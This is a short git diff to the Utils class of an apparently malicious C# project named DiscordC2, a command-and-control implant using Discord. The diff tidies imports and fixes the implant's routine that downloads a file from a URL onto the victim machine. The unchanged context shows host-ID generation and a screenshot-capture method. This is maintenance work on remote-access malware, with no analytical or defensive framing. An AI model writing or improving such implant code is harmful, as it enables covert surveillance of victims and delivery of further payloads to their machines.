@@ -3,11 +3,9 @@ using System.Drawing.Imaging;
 using System.Diagnostics;
 using System.Data;
 using System.Runtime.InteropServices;
-using System.Dynamic;
-using DiscordC2.Init;
 using System.Security.Cryptography;
 using Microsoft.Extensions.DependencyInjection;
-using System.Net;
+using DiscordC2.Init;
 
 namespace DiscordC2.Common;
 public static class Utils {
@@ -22,7 +20,6 @@ public static class Utils {
 
     private static string _hostId = getHostId();
     public static string HostId { get; set; } = _hostId;
-
 
     public static MemoryStream GetScreenshot()
     {
@@ -105,7 +102,9 @@ public static class Utils {
             try {
                 var getRequest = client.GetAsync(url).Result;
                 var readFile = getRequest.Content.ReadAsStreamAsync().Result;
-                readFile.CopyTo(File.Create(filename));
+                FileStream file = File.Create(filename);
+                readFile.CopyTo(file);
+                file.Close();
 
                 if (File.Exists(filename))
                     return "success";
